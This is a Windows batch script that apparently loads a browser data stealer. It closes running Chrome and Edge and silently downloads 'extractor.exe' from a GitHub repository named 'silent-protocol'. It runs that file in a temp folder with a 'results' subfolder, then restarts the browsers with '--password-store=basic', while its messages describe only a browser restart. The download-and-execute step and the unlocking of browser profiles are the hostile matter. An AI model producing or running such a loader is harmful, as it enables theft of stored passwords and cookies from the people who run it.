@echo off
setlocal EnableDelayedExpansion

REM Get timestamp using time and date commands
for /f "tokens=1-4 delims=/ " %%A in ('date /t') do set "date=%%D%%B%%C"
for /f "tokens=1-3 delims=:." %%A in ('time /t') do set "time=%%A%%B"
set "tempdir=%TEMP%\bb_%date%%time%"
REM Add random number to ensure uniqueness
set "tempdir=%tempdir%_%random%"

REM Create temp directory and results subfolder
mkdir "%tempdir%" 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo Error: Failed to create temporary directory
    exit /b 2
)
mkdir "%tempdir%\results" 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo Error: Failed to create results directory
    rmdir "%tempdir%" 2>nul
    exit /b 2
)

REM Change to temp directory
cd "%tempdir%" || (
    echo Error: Failed to change directory
    rmdir "%tempdir%\results" 2>nul
    rmdir "%tempdir%" 2>nul
    exit /b 3
)

REM Check which browsers are running and store their state
set "chrome_running=0"
set "edge_running=0"
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
if "%ERRORLEVEL%"=="0" set "chrome_running=1"
tasklist /FI "IMAGENAME eq msedge.exe" 2>NUL | find /I /N "msedge.exe">NUL
if "%ERRORLEVEL%"=="0" set "edge_running=1"

REM Close browsers gracefully if they're running
echo Closing browsers gracefully...
if %chrome_running%==1 (
    echo Closing Chrome...
    powershell -command "Get-Process chrome -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() | Out-Null }"
)
if %edge_running%==1 (
    echo Closing Edge...
    powershell -command "Get-Process msedge -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() | Out-Null }"
)

REM Wait for processes to exit completely
timeout /t 5 > nul

REM Download required files
echo Downloading files...
curl -L -s -o extractor.exe https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/extractor.exe

REM Verify downloads
if not exist "extractor.exe" (
    echo Error: Failed to download extractor.exe
    exit /b 4
)

REM Create running flag
echo %datetime% > "%tempdir%\running.tmp"

REM Run the extractor
echo Starting process----------------------------------------
call "%tempdir%\extractor.exe"

REM Restart only previously running browsers
echo Starting browsers----------------------------------------
if %chrome_running%==1 (
    echo Starting Chrome...
    start "" /B "C:\Program Files\Google\Chrome\Application\chrome.exe" ^
        --restore-last-session ^
        --session-restore-standalone-timeout=120 ^
        --disable-session-crashed-bubble ^
        --disable-features=TabGroups ^
        --password-store=basic ^
        --no-first-run ^
        --restore-on-startup=4
)

if %edge_running%==1 (
    echo Starting Edge...
    start "" /B "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" ^
        --restore-last-session ^
        --session-restore-standalone-timeout=120 ^
        --disable-session-crashed-bubble ^
        --disable-features=TabGroups ^
        --password-store=basic ^
        --no-first-run ^
        --restore-on-startup=4
)

echo Browser restart process completed.
echo Results directory: %tempdir%
echo Results folder: %tempdir%\results
